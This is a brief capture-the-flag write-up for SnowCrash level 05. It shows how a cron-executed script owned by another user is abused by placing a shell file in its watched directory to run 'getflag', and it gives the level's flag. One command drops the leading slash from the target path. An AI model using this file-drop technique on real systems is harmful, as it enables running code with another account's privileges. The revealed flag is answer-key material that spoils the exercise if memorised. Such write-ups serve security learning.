# Level 05

```bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script executes all files in the /opt/openarenaserver then removes them

We create a file and wait for the script to be ran (in a cron ?)
```bash
echo "getflag > /tmp/toto" > opt/openarenaserver/toto.sh
```
```bash
cat /tmp/toto
```

**Flag** : viuaaale9huek52boumoomioc
